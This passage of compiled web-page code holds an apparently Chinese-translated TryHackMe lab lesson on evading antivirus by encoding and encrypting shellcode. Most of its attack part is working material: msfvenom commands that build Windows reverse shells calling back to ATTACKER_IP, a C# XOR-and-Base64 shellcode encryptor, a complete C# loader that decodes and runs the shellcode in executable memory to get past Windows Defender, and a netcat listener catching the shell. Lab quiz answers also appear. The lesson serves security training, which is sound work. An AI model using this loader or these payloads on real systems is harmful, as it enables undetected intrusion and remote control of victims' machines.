EXE\u3001\u56fe\u50cf\u7b49\uff09\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u7f16\u7801\u662f\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u901a\u5e38\u7528\u4e8e\u591a\u79cd\u76ee\u7684\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u7a0b\u5e8f\u7f16\u8bd1\u548c\u6267\u884c"}),"\n",(0,l.jsx)(n.li,{children:"\u6570\u636e\u5b58\u50a8\u548c\u4f20\u8f93"}),"\n",(0,l.jsx)(n.li,{children:"\u6570\u636e\u5904\u7406\uff0c\u4f8b\u5982\u6587\u4ef6\u8f6c\u6362"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"\u540c\u6837\uff0c\u5728\u6d89\u53ca\u9632\u75c5\u6bd2\uff08AV\uff09\u89c4\u907f\u6280\u672f\u65f6\uff0c\u7f16\u7801\u4e5f\u7528\u4e8e\u9690\u85cf\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684 shellcode \u5b57\u7b26\u4e32\u3002\u7136\u800c\uff0c\u4ec5\u9760\u7f16\u7801\u5e76\u4e0d\u8db3\u4ee5\u5b9e\u73b0\u89c4\u907f\u76ee\u7684\u3002\u5982\u4eca\uff0c\u9632\u75c5\u6bd2\u8f6f\u4ef6\u66f4\u52a0\u667a\u80fd\uff0c\u80fd\u591f\u5206\u6790\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e00\u65e6\u53d1\u73b0\u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u4fbf\u4f1a\u89e3\u7801\u4ee5\u68c0\u67e5\u6587\u672c\u7684\u539f\u59cb\u5f62\u5f0f\u3002"}),"\n",(0,l.jsx)(n.p,{children:'\u4f60\u8fd8\u53ef\u4ee5\u4e32\u8054\u4f7f\u7528\u4e24\u79cd\u6216\u66f4\u591a\u7f16\u7801\u7b97\u6cd5\uff0c\u4ee5\u589e\u52a0\u9632\u75c5\u6bd2\u8f6f\u4ef6\u8bc6\u522b\u9690\u85cf\u5185\u5bb9\u7684\u96be\u5ea6\u3002\u4e0b\u56fe\u5c55\u793a\u4e86\u6211\u4eec\u5c06\u5b57\u7b26\u4e32 "THM" \u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\uff0c\u7136\u540e\u4f7f\u7528 Base64 \u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f60\u9700\u8981\u786e\u4fdd\u4f60\u7684\u6295\u653e\u7a0b\u5e8f\u80fd\u591f\u5904\u7406\u6b64\u7c7b\u7f16\u7801\uff0c\u4ee5\u5c06\u5b57\u7b26\u4e32\u6062\u590d\u4e3a\u5176\u539f\u59cb\u72b6\u6001\u3002'}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Double Text Encoding Technique",src:s(3011).A+"",width:"409",height:"220"})}),"\n",(0,l.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f\u52a0\u5bc6",children:"\u4ec0\u4e48\u662f\u52a0\u5bc6\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"\u52a0\u5bc6\u662f\u4fe1\u606f\u548c\u6570\u636e\u5b89\u5168\u7684\u57fa\u672c\u8981\u7d20\u4e4b\u4e00\uff0c\u5176\u91cd\u70b9\u662f\u9632\u6b62\u672a\u7ecf\u6388\u6743\u7684\u8bbf\u95ee\u548c\u6570\u636e\u7be1\u6539\u3002\u52a0\u5bc6\u8fc7\u7a0b\u6d89\u53ca\u5c06\u660e\u6587\uff08\u672a\u52a0\u5bc6\u7684\u5185\u5bb9\uff09\u8f6c\u6362\u4e3a\u79f0\u4e3a\u5bc6\u6587\u7684\u52a0\u5bc6\u7248\u672c\u3002\u5982\u679c\u4e0d\u4e86\u89e3\u52a0\u5bc6\u4e2d\u4f7f\u7528\u7684\u7b97\u6cd5\u548c\u5bc6\u94a5\uff0c\u5bc6\u6587\u5c06\u65e0\u6cd5\u88ab\u8bfb\u53d6\u6216\u89e3\u5bc6\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4e0e\u7f16\u7801\u7c7b\u4f3c\uff0c\u52a0\u5bc6\u6280\u672f\u7528\u4e8e\u591a\u79cd\u76ee\u7684\uff0c\u4f8b\u5982\u5b89\u5168\u5730\u5b58\u50a8\u548c\u4f20\u8f93\u6570\u636e\uff0c\u4ee5\u53ca\u5b9e\u73b0\u7aef\u5230\u7aef\u52a0\u5bc6\u3002\u52a0\u5bc6\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u4f7f\u7528\uff1a\u53cc\u65b9\u5171\u4eab\u4e00\u4e2a\u5bc6\u94a5\uff0c\u6216\u4f7f\u7528\u516c\u94a5\u548c\u79c1\u94a5\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u6709\u5173\u52a0\u5bc6\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u6211\u4eec\u5efa\u8bae\u4f60\u67e5\u770b ",(0,l.jsx)(n.a,{href:"https://tryhackme.com/room/encryptioncrypto101",children:"\u52a0\u5bc6 - \u52a0\u5bc6\u5165\u95e8"})," \u623f\u95f4\u3002"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Encryption and Decryption Concepts!",src:s(5069).A+"",width:"878",height:"476"})}),"\n",(0,l.jsx)(n.h3,{id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6",children:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"\u9632\u75c5\u6bd2\uff08AV\uff09\u4f9b\u5e94\u5546\u901a\u8fc7\u9759\u6001\u6216\u52a8\u6001\u68c0\u6d4b\u6280\u672f\uff0c\u5c06\u5927\u591a\u6570\u516c\u5f00\u5de5\u5177\uff08\u5982 Metasploit \u7b49\uff09\u5217\u5165\u5176\u9632\u75c5\u6bd2\u8f6f\u4ef6\u7684\u963b\u6b62\u5217\u8868\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e0d\u4fee\u6539\u8fd9\u4e9b\u516c\u5f00\u5de5\u5177\u751f\u6210\u7684 shellcode\uff0c\u4f60\u7684\u6295\u653e\u7a0b\u5e8f\u88ab\u68c0\u6d4b\u5230\u7684\u6982\u7387\u4f1a\u5f88\u9ad8\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u7f16\u7801\u548c\u52a0\u5bc6\u53ef\u4ee5\u7528\u4e8e\u9632\u75c5\u6bd2\u89c4\u907f\u6280\u672f\u4e2d\uff0c\u901a\u8fc7\u5bf9\u6295\u653e\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684 shellcode \u8fdb\u884c\u7f16\u7801\u548c/\u6216\u52a0\u5bc6\uff0c\u4ee5\u5728\u8fd0\u884c\u65f6\u5c06\u5176\u9690\u85cf\uff0c\u4ece\u800c\u89c4\u907f\u9632\u75c5\u6bd2\u8f6f\u4ef6\u7684\u68c0\u6d4b\u3002\u6b64\u5916\uff0c\u8fd9\u4e24\u79cd\u6280\u672f\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u9690\u85cf shellcode\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u9690\u85cf\u51fd\u6570\u3001\u53d8\u91cf\u7b49\u3002\u5728\u672c\u623f\u95f4\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u901a\u8fc7\u52a0\u5bc6 shellcode \u6765\u89c4\u907f Windows Defender\u3002"}),"\n",(0,l.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(n.p,{children:"\u4ec5\u5bf9 shellcode \u8fdb\u884c\u7f16\u7801\u662f\u5426\u8db3\u4ee5\u89c4\u907f\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff1f (yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"nay\n"})}),(0,l.jsx)(n.p,{children:"\u7f16\u7801\u6280\u672f\u662f\u5426\u4f7f\u7528\u5bc6\u94a5\u6765\u7f16\u7801\u5b57\u7b26\u4e32\u6216\u6587\u4ef6\uff1f (yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"nay\n"})}),(0,l.jsx)(n.p,{children:"\u52a0\u5bc6\u7b97\u6cd5\u662f\u5426\u4f7f\u7528\u5bc6\u94a5\u6765\u52a0\u5bc6\u5b57\u7b26\u4e32\u6216\u6587\u4ef6\uff1f (yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"yea\n"})})]}),"\n",(0,l.jsx)(n.h2,{id:"shellcode-encoding-and-encryption---shellcode-\u7f16\u7801\u4e0e\u52a0\u5bc6",children:"Shellcode Encoding and Encryption - Shellcode \u7f16\u7801\u4e0e\u52a0\u5bc6"}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u7f16\u7801",children:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u7f16\u7801"}),"\n",(0,l.jsx)(n.p,{children:"\u8bf8\u5982 Metasploit \u4e4b\u7c7b\u7684\u516c\u5f00\u5de5\u5177\u63d0\u4f9b\u4e86\u7f16\u7801\u548c\u52a0\u5bc6\u529f\u80fd\u3002\u7136\u800c\uff0c\u9632\u75c5\u6bd2\u4f9b\u5e94\u5546\u5df2\u7ecf\u4e86\u89e3\u8fd9\u4e9b\u5de5\u5177\u6784\u5efa\u5176\u8f7d\u8377\u7684\u65b9\u5f0f\uff0c\u5e76\u91c7\u53d6\u63aa\u65bd\u8fdb\u884c\u68c0\u6d4b\u3002\u5982\u679c\u4f60\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e9b\u529f\u80fd\uff0c\u4f60\u7684\u8f7d\u8377\u5f88\u53ef\u80fd\u4f1a\u5728\u6587\u4ef6\u89e6\u53ca\u53d7\u5bb3\u8005\u78c1\u76d8\u65f6\u88ab\u7acb\u5373\u68c0\u6d4b\u5230\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u7b80\u5355\u7684\u8f7d\u8377\u6765\u8bc1\u660e\u8fd9\u4e00\u70b9\u3002\u9996\u5148\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5217\u51fa msfvenom \u53ef\u7528\u7684\u6240\u6709\u7f16\u7801\u5668\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ msfvenom --list encoders | grep excellent\r\n    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder\r\n    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",(0,l.jsx)(n.code,{children:"-e"})," \u53c2\u6570\u6307\u5b9a\u8981\u4f7f\u7528\u7684\u7f16\u7801\u5668\uff0c\u7136\u540e\u901a\u8fc7 ",(0,l.jsx)(n.code,{children:"-i"})," \u53c2\u6570\u6307\u5b9a\u5bf9\u8f7d\u8377\u8fdb\u884c\u4e09\u6b21\u7f16\u7801\uff1a\r\n",(0,l.jsx)(n.code,{children:"shikata_ga_nai"})," ",(0,l.jsx)(n.code,{children:"-e"})," ",(0,l.jsx)(n.code,{children:"-i"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\\x00' -i 3 -f csharp\r\nFound 1 compatible encoders\r\nAttempting to encode payload with 3 iterations of x86/shikata_ga_nai\r\nx86/shikata_ga_nai succeeded with size 368 (iteration=0)\r\nx86/shikata_ga_nai succeeded with size 395 (iteration=1)\r\nx86/shikata_ga_nai succeeded with size 422 (iteration=2)\r\nx86/shikata_ga_nai chosen with final size 422\r\nPayload size: 422 bytes\r\nFinal size of csharp file: 2170 bytes\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u5c06\u65b0\u751f\u6210\u7684\u8f7d\u8377\u4e0a\u4f20\u5230\u6d4b\u8bd5\u673a\u5668\uff0c\u9632\u75c5\u6bd2\u8f6f\u4ef6\u4f1a\u5728\u6211\u4eec\u6709\u673a\u4f1a\u6267\u884c\u5b83\u4e4b\u524d\u7acb\u5373\u6807\u8bb0\u5b83\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Windows Defender detected our payload as malicious!",src:s(9955).A+"",width:"539",height:"292"})}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u7f16\u7801\u4e0d\u8d77\u4f5c\u7528\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u52a0\u5bc6\u8f7d\u8377\u3002\u76f4\u89c2\u4e0a\uff0c\u6211\u4eec\u4f1a\u9884\u671f\u8fd9\u79cd\u65b9\u6cd5\u6709\u66f4\u9ad8\u7684\u6210\u529f\u7387\uff0c\u56e0\u4e3a\u89e3\u5bc6\u8f7d\u8377\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\u6765\u8bf4\u5e94\u8be5\u662f\u4e00\u9879\u66f4\u56f0\u96be\u7684\u4efb\u52a1\u3002\u73b0\u5728\u8ba9\u6211\u4eec\u6765\u8bd5\u8bd5\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u52a0\u5bc6",children:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u52a0\u5bc6"}),"\n",(0,l.jsx)(n.p,{children:"\u4f60\u53ef\u4ee5\u4f7f\u7528 msfvenom \u8f7b\u677e\u751f\u6210\u52a0\u5bc6\u7684\u8f7d\u8377\u3002\u7136\u800c\uff0c\u53ef\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\u9009\u62e9\u76f8\u5bf9\u6709\u9650\u3002\u8981\u5217\u51fa\u53ef\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ msfvenom --list encrypt\r\nFramework Encryption Formats [--encrypt <value>]\r\n================================================\r\n\r\n    Name\r\n    ----\r\n    aes256\r\n    base64\r\n    rc4\r\n    xor\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u6784\u5efa\u4e00\u4e2a XOR \u52a0\u5bc6\u7684\u8f7d\u8377\u3002\u5bf9\u4e8e\u8fd9\u79cd\u7c7b\u578b\u7684\u7b97\u6cd5\uff0c\u4f60\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u5bc6\u94a5\u3002\u547d\u4ee4\u5982\u4e0b\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe\r\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\r\n[-] No arch selected, selecting arch: x64 from the payload\r\nNo encoder specified, outputting raw payload\r\nPayload size: 510 bytes\r\nFinal size of exe file: 7168 bytes\r\nSaved as: xored-revshell.exe\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u518d\u6b21\uff0c\u5982\u679c\u6211\u4eec\u5c06\u751f\u6210\u7684 shell \u4e0a\u4f20\u5230 THM \u9632\u75c5\u6bd2\u68c0\u67e5\u9875\u9762 ",(0,l.jsx)(n.code,{children:"http://10.10.14.106/"}),"\uff0c\u5b83\u4ecd\u7136\u4f1a\u88ab\u9632\u75c5\u6bd2\u8f6f\u4ef6\u6807\u8bb0\u3002\u539f\u56e0\u4ecd\u7136\u662f\u9632\u75c5\u6bd2\u4f9b\u5e94\u5546\u6295\u5165\u4e86\u5927\u91cf\u65f6\u95f4\u6765\u786e\u4fdd\u68c0\u6d4b\u5230\u7b80\u5355\u7684 msfvenom \u8f7d\u8377\u3002"]}),"\n",(0,l.jsx)(n.h3,{id:"\u521b\u5efa\u81ea\u5b9a\u4e49\u8f7d\u8377",children:"\u521b\u5efa\u81ea\u5b9a\u4e49\u8f7d\u8377"}),"\n",(0,l.jsx)(n.p,{children:"\u514b\u670d\u8fd9\u4e00\u95ee\u9898\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u4f7f\u7528\u6211\u4eec\u81ea\u5df1\u7684\u81ea\u5b9a\u4e49\u7f16\u7801\u65b9\u6848\uff0c\u8fd9\u6837\u9632\u75c5\u6bd2\u8f6f\u4ef6\u5c31\u4e0d\u77e5\u9053\u5982\u4f55\u5206\u6790\u6211\u4eec\u7684\u8f7d\u8377\u3002\u8bf7\u6ce8\u610f\uff0c\u4f60\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u592a\u590d\u6742\u7684\u4e8b\u60c5\uff0c\u53ea\u8981\u5b83\u8db3\u591f\u8ba9\u9632\u75c5\u6bd2\u8f6f\u4ef6\u96be\u4ee5\u5206\u6790\u5373\u53ef\u3002\u5728\u672c\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 msfvenom \u751f\u6210\u7684\u7b80\u5355\u53cd\u5411 shell\uff0c\u5e76\u901a\u8fc7 XOR \u548c Base64 \u7684\u7ec4\u5408\u6765\u7ed5\u8fc7 Defender\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u9996\u5148\u4f7f\u7528 msfvenom \u751f\u6210\u4e00\u4e2a CSharp \u683c\u5f0f\u7684\u53cd\u5411 shell\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u7f16\u7801\u5668",children:"\u7f16\u7801\u5668"}),"\n",(0,l.jsxs)(n.p,{children:["\u5728\u6784\u5efa\u5b9e\u9645\u8f7d\u8377\u4e4b\u524d\uff0c\u6211\u4eec\u5c06\u521b\u5efa\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u7528\u4e8e\u5bf9 msfvenom \u751f\u6210\u7684 shellcode \u8fdb\u884c\u7f16\u7801\u3002\u5728\u672c\u4f8b\u4e2d\uff0c\u6211\u4eec\u5c06\u9996\u5148\u4f7f\u7528\u81ea\u5b9a\u4e49\u5bc6\u94a5\u5bf9\u8f7d\u8377\u8fdb\u884c XOR \u52a0\u5bc6\uff0c\u7136\u540e\u4f7f\u7528 base64 \u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u3002\u4ee5\u4e0b\u662f\u7f16\u7801\u5668\u7684\u5b8c\u6574\u4ee3\u7801\uff08\u4f60\u4e5f\u53ef\u4ee5\u5728 Windows \u673a\u5668\u7684 ",(0,l.jsx)(n.code,{children:"C:\\Tools\\CS Files\\Encryptor.cs"})," \u4e2d\u627e\u5230\u6b64\u4ee3\u7801\uff09\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Threading.Tasks;\r\n\r\nnamespace Encrypter\r\n{\r\n    internal class Program\r\n    {\r\n        private static byte[] xor(byte[] shell, byte[] KeyBytes)\r\n        {\r\n            for (int i = 0; i < shell.Length; i++)\r\n            {\r\n                shell[i] ^= KeyBytes[i % KeyBytes.Length];\r\n            }\r\n            return shell;\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            //XOR Key - It has to be the same in the Droppr for Decrypting\r\n            string key = "THMK3y123!";\r\n\r\n            //Convert Key into bytes\r\n            byte[] keyBytes = Encoding.ASCII.GetBytes(key);\r\n\r\n            //Original Shellcode here (csharp format)\r\n            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };\r\n\r\n            //XORing byte by byte and saving into a new array of bytes\r\n            byte[] encoded = xor(buf, keyBytes);\r\n            Console.WriteLine(Convert.ToBase64String(encoded));        \r\n        }\r\n    }\r\n}\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u4ee3\u7801\u975e\u5e38\u7b80\u5355\uff0c\u5b83\u5c06\u751f\u6210\u4e00\u4e2a\u7f16\u7801\u540e\u7684\u8f7d\u8377\uff0c\u6211\u4eec\u5c06\u628a\u5b83\u5d4c\u5165\u5230\u6700\u7ec8\u7684\u8f7d\u8377\u4e2d\u3002\u8bb0\u5f97\u5c06 ",(0,l.jsx)(n.code,{children:"buf"})," \u53d8\u91cf\u66ff\u6362\u4e3a\u4f60\u4f7f\u7528 msfvenom \u751f\u6210\u7684 shellcode\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u8981\u5728 Windows \u673a\u5668\u4e0a\u7f16\u8bd1\u5e76\u6267\u884c\u7f16\u7801\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"C:\\> csc.exe Encrypter.cs\r\nC:\\> .\\Encrypter.exe\r\nqKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u81ea\u89e3\u7801\u8f7d\u8377",children:"\u81ea\u89e3\u7801\u8f7d\u8377"}),"\n",(0,l.jsxs)(n.p,{children:["\u7531\u4e8e\u6211\u4eec\u6709\u4e00\u4e2a\u7f16\u7801\u540e\u7684\u8f7d\u8377\uff0c\u6211\u4eec\u9700\u8981\u8c03\u6574\u4ee3\u7801\uff0c\u4f7f\u5176\u5728\u6267\u884c\u4e4b\u524d\u5bf9 shellcode \u8fdb\u884c\u89e3\u7801\u3002\u4e3a\u4e86\u4e0e\u7f16\u7801\u5668\u5339\u914d\uff0c\u6211\u4eec\u5c06\u6309\u7167\u7f16\u7801\u7684\u76f8\u53cd\u987a\u5e8f\u8fdb\u884c\u89e3\u7801\uff0c\u56e0\u6b64\u6211\u4eec\u9996\u5148\u89e3\u7801 base64 \u5185\u5bb9\uff0c\u7136\u540e\u4f7f\u7528\u4e0e\u7f16\u7801\u5668\u76f8\u540c\u7684\u5bc6\u94a5\u5bf9\u7ed3\u679c\u8fdb\u884c XOR \u89e3\u5bc6\u3002\u4ee5\u4e0b\u662f\u5b8c\u6574\u7684\u8f7d\u8377\u4ee3\u7801\uff08\u4f60\u4e5f\u53ef\u4ee5\u5728 Windows \u673a\u5668\u7684 ",(0,l.jsx)(n.code,{children:"C:\\Tools\\CS Files\\EncStageless.cs"})," \u4e2d\u627e\u5230\u5b83\uff09\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:'using System;\r\nusing System.Net;\r\nusing System.Text;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class Program {\r\n  [DllImport("kernel32")]\r\n  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\r\n\r\n  [DllImport("kernel32")]\r\n  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\r\n\r\n  [DllImport("kernel32")]\r\n  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\r\n\r\n  private static UInt32 MEM_COMMIT = 0x1000;\r\n  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\r\n  \r\n  private static byte[] xor(byte[] shell, byte[] KeyBytes)\r\n        {\r\n            for (int i = 0; i < shell.Length; i++)\r\n            {\r\n                shell[i] ^= KeyBytes[i % KeyBytes.Length];\r\n            }\r\n            return shell;\r\n        }\r\n  public static void Main()\r\n  {\r\n\r\n    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";\r\n    byte[] data = Convert.FromBase64String(dataBS64);\r\n\r\n    string key = "THMK3y123!";\r\n    //Convert Key into bytes\r\n    byte[] keyBytes = Encoding.ASCII.GetBytes(key);\r\n\r\n    byte[] encoded = xor(data, keyBytes);\r\n\r\n    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\r\n    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);\r\n\r\n    IntPtr threadHandle = IntPtr.Zero;\r\n    UInt32 threadId = 0;\r\n    IntPtr parameter = IntPtr.Zero;\r\n    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\r\n\r\n    WaitForSingleObject(threadHandle, 0xFFFFFFFF);\r\n\r\n  }\r\n}\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u4ec5\u4ec5\u662f\u5c06\u4e24\u4e2a\u72ec\u7acb\u4f7f\u7528\u65f6\u88ab\u68c0\u6d4b\u5230\u7684\u975e\u5e38\u7b80\u5355\u7684\u6280\u672f\u8fdb\u884c\u4e86\u7ed3\u5408\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u8fd9\u6b21\u6740\u6bd2\u8f6f\u4ef6\u4e0d\u4f1a\u5bf9\u8f7d\u8377\u63d0\u51fa\u8b66\u544a\uff0c\u56e0\u4e3a\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684\u7ed3\u5408\u65b9\u5f0f\u662f\u5b83\u65e0\u6cd5\u76f4\u63a5\u5206\u6790\u7684\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u5728 Windows \u673a\u5668\u4e0a\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u7f16\u8bd1\u6211\u4eec\u7684\u8f7d\u8377\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"C:\\> csc.exe EncStageless.cs\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u5728\u8fd0\u884c\u6211\u4eec\u7684\u8f7d\u8377\u4e4b\u524d\uff0c\u5148\u4f7f\u7528",(0,l.jsx)(n.code,{children:"nc"}),"\u8bbe\u7f6e\u4e00\u4e2a\u76d1\u542c\u5668\u3002\u5728\u5c06\u8f7d\u8377\u590d\u5236\u5e76\u6267\u884c\u5230\u53d7\u5bb3\u8005\u673a\u5668\u540e\uff0c\u6211\u4eec\u5e94\u8be5\u5982\u9884\u671f\u4e00\u6837\u6536\u5230\u56de\u8fde\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ nc -lvp 443\r\nListening on [0.0.0.0] (family 0, port 443)\r\nConnection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!\r\nMicrosoft Windows [Version 10.0.17763.1821]\r\n(c) 2018 Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Windows\\System32>\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u4f60\u6240\u89c1\uff0c\u6709\u65f6\u7b80\u5355\u7684\u8c03\u6574\u5c31\u8db3\u591f\u4e86\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4f60\u5728\u7f51\u4e0a\u627e\u5230\u7684\u4efb\u4f55\u7279\u5b9a\u65b9\u6cd5\u53ef\u80fd\u65e0\u6cd5\u76f4\u63a5\u594f\u6548\uff0c\u56e0\u4e3a\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u76f8\u5e94\u7684\u68c0\u6d4b\u7b7e\u540d\u3002\u7136\u800c\uff0c\u901a\u8fc7\u7a0d\u5fae\u53d1\u6325\u60f3\u8c61\u529b\uff0c\u5b9a\u5236\u4efb\u4f55\u65b9\u6cd5\uff0c\u53ef\u80fd\u8db3\u4ee5\u6210\u529f\u7ed5\u8fc7\u68c0\u6d4b\u3002"}),"\n",(0,l.jsx)(n.admonition,{title:"Answer the questions below",type:"info",children:(0,l.jsxs)(n.p,{children:["\u5c1d\u8bd5\u5728 THM Antivirus Check \u4e0a\u4f7f\u7528\u8fd9\u79cd\u6280\u672f\uff08\u7ed3\u5408\u7f16\u7801\u548c\u52a0\u5bc6\uff09\u3002\u5b83\u80fd\u7ed5\u8fc7\u5b89\u88c5\u7684 AV \u8f6f\u4ef6\u5417\uff1f",(0,l.jsx)(n.code,{children:"http://10.10.14.106/"})]})}),"\n",(0,l.jsx)(n.h2,{id:"packers---\u6253\u5305\u5de5\u5177",children:"Packers - 